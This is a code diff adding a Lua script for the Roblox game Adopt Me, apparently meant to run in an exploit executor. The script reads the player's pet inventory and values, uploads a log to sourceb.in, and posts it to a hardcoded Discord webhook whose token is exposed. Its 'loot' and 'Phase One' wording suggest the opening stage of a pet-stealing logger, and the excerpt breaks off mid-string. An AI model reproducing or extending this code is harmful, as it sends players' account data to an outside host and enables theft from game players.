@@ -1,0 +1,67 @@
+if _G.__MondeurPhaseOne then return end
+_G.__MondeurPhaseOne = true
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- [1] LOADING SCREEN SAFETY
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+-- Wait for player to actually spawn before continuing
+while not Players.LocalPlayer do task.wait(0.5) end
+local LocalPlayer = Players.LocalPlayer
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
+
+-- [2] WAIT FOR ADOPT ME SYSTEMS
+local Fsys = ReplicatedStorage:WaitForChild("Fsys", 999)
+local API = ReplicatedStorage:WaitForChild("API", 999)
+local GetInvAPI = API:WaitForChild("InventoryAPI/GetInventory", 999)
+
+local Fsys2 = require(Fsys)
+local load = Fsys2.load
+local InventoryDB = load("InventoryDB")
+
+local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+
+-- [3] SOURCEBIN UPLOAD
+local function uploadLog(pets)
+    if not requestFunc then return nil end
+    local lines = {"=== MONDEUR INVENTORY LOG ==="}
+    table.insert(lines, "Player: " .. LocalPlayer.Name)
+    table.insert(lines, "------------------------------")
+    for i, p in ipairs(pets) do
+        table.insert(lines, string.format("[%d] %s | Value: %s", i, p.name, tostring(p.value)))
+    end
+    
+    local ok, res = pcall(function()
+        return requestFunc({
+            Url = "https://sourceb.in/api/bins",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({files = {{content = table.concat(lines, "\n")}}})
+        })
+    end)
+    
+    if ok and res and res.StatusCode == 200 then
+        local data = HttpService:JSONDecode(res.Body)
+        if data and data.key then return "https://srcb.in/" .. data.key end
+    end
+    return nil
+end
+
+-- [4] WEBHOOK SEND
+local function sendWebhook(pets, totalVal, totalCount)
+    if not requestFunc then return end
+    
+    local binUrl = uploadLog(pets)
+    local lootText = ""
+    for i, p in ipairs(pets) do
+        if i > 25 then break end
+        lootText = lootText .. "🐾 " .. p.name .. " : `" .. tostring(p.value) .. "`\n"
+    end
+    if lootText == "" then lootText = "Empty" end
+
+    -- Using format to prevent malformed string errors
+    local p_info = string.format("
